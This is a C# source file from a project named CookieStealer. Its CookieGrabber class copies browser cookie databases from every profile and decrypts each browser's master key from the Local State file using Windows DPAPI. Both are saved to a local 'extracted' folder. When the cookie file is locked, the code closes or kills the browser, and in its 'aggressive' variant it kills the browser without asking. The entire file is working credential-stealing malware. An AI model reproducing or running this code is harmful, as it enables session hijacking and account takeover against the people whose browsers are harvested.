using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.Json.Serialization;
using JsonSerializer = System.Text.Json.JsonSerializer;


namespace CookieStealer.Utilities;

public class CookieGrabber
{
    private readonly Dictionary<string, BrowserInfo> _browsers = new BrowserData().Browsers;
    private readonly string _userDomainName = Environment.UserDomainName;
    private readonly string _userName = Environment.UserName;
    private readonly string _workingDirectory;


    public CookieGrabber()
    {
        var now = DateTime.Now;
        var currentTime = now.ToString("yyMMddHHmm");

        _workingDirectory = @$"extracted\{_userDomainName}\{_userName}\{currentTime}";

        foreach (var browser in _browsers)
        {
            var path = $@"{_workingDirectory}\{browser.Key}\database";
            Directory.CreateDirectory(Path.Combine(path, "Default"));

            if (!browser.Value.ProfilesPossible) continue;
            foreach (var profileName in browser.Value.ProfileList.Select(profile =>
                         Directory.GetParent(profile).Parent.Name))
                Directory.CreateDirectory(Path.Combine(path, profileName));
        }
    }


    public void GrabNRun(int variant = 0)
    {
        foreach (var browser in _browsers)
        {
            var currentDirectory = Path.Combine(_workingDirectory, browser.Key, "database");
            var cookiePath = browser.Value.PathToCookiesFile;

            if (browser.Value.NeedDecryption)
            {
                var key = GetKey(browser.Value.PathToLocalState);
                File.WriteAllBytes(Path.Combine(currentDirectory, "master.key"), key);
            }

            switch (variant)
            {
                case 0:
                    GrabNRunDefault(browser, currentDirectory);
                    break;
                case 1:
                    GrabNRunAggressive(browser, currentDirectory);
                    break;
            }
        }
    }

    private void CopyCookies(KeyValuePair<string, BrowserInfo> browser, string currentDirectory)
    {
        File.Copy(browser.Value.PathToCookiesFile, Path.Combine(currentDirectory, "Default", "Cookies"));

        if (browser.Value is { ProfilesPossible: true, ProfileList: not null })
            foreach (var profile in browser.Value.ProfileList)
            {
                var profileName = Directory.GetParent(profile).Parent.Name;
                File.Copy(profile, Path.Combine(currentDirectory, profileName, "Cookies"));
            }
    }

    private void GrabNRunDefault(KeyValuePair<string, BrowserInfo> browser, string? currentDirectory)
    {
        try
        {
            CopyCookies(browser, currentDirectory);
        }
        catch (IOException)
        {
            Console.WriteLine(
                $"Can't copy Cookies file because browser is currently running. Do you want to try to close {browser.Key}? [Y/N]");
            var ans1 = Console.ReadKey();

            switch (ans1.KeyChar)
            {
                case 'y':
                    Console.Clear();
                    var processes = Process.GetProcessesByName(browser.Value.ProcessName);

                    foreach (var process in processes)
                    {
                        process.CloseMainWindow();
                        if (!process.WaitForExit(3000))
                        {
                            Console.WriteLine(
                                $"Couldn't terminate the process. Do you want to kill {browser.Key}? [Y/N]");
                            var ans2 = Console.ReadKey();

                            switch (ans2.KeyChar)
                            {
                                case 'y':
                                    Console.Clear();
                                    process.Kill();
                                    break;
                                case 'n':
                                    break;
                            }
                        }
                    }

                    Thread.Sleep(500);
                    CopyCookies(browser, currentDirectory);
                    break;

                case 'n':
                    Console.Clear();
                    break;
            }
        }
    }

    private void GrabNRunAggressive(KeyValuePair<string, BrowserInfo> browser, string? currentDirectory)
    {
        try
        {
            CopyCookies(browser, currentDirectory);
        }
        catch (IOException)
        {
            var processes = Process.GetProcessesByName(browser.Key.ToLower());
            foreach (var process in processes) process.Kill();
            Thread.Sleep(500);
            CopyCookies(browser, currentDirectory);
        }
    }


    private static byte[] GetKey(string? localStatePath)
    {
        var localStateContent = File.ReadAllText(localStatePath);
        var localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
        var encryptedKey = localState?.OsCrypt?.EncryptedKey;

        var keyWithPrefix = Convert.FromBase64String(encryptedKey);
        var key = keyWithPrefix[5..];
        byte[] masterKey;
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            masterKey = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        }
        else
        {
            Environment.Exit(1);
            return null;
        }

        return masterKey;
    }

    private class LocalStateDto
    {
        [JsonPropertyName("os_crypt")] public OsCrypt? OsCrypt { get; set; }
    }

    private class OsCrypt
    {
        public OsCrypt(string? encryptedKey)
        {
            EncryptedKey = encryptedKey;
        }

        [JsonPropertyName("encrypted_key")] public string? EncryptedKey { get; }
    }
}